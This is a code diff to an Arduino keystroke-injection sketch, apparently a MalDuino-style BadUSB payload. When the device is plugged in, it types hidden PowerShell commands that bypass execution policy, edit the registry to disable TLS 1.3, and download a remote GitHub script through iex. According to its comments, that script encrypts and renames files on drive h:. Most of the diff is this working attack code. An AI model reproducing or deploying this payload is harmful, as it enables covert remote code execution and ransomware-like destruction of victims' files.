@@ -37,7 +37,7 @@ void setup() {
 
   /* ----- Begin-Payload -----*/
   delay(1000);            // extra 1s delay, can be adjusted if needed
-  
+
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
   Keyboard.releaseAll();
@@ -68,31 +68,29 @@ void setup() {
   delay(defaultDelay);
   typeKey(KEY_RETURN);
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex}");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.3\\\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex}");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.3\\\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex}");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
 
   // run encryption script directly from github
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type="single_enc"; $file="test.txt"; $file_path="h:"; $show_screen="no"; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex}");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type=\"single_enc\"; $file=\"test.txt\"; $file_path=\"h:\"; $show_screen=\"no\"; (New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1\") | iex}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
-
-  // run multiple rename script directly from github
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type="multi_ren"; $file=".db"; $file_path="h:"; $show_screen="yes"; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex}");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type=\"multi_ren\"; $file=\".db\"; $file_path=\"h:\"; $show_screen=\"yes\"; (New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1\") | iex}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
-
   /* ----- End-Payload -----*/
+  
   Keyboard.end();
 }
 
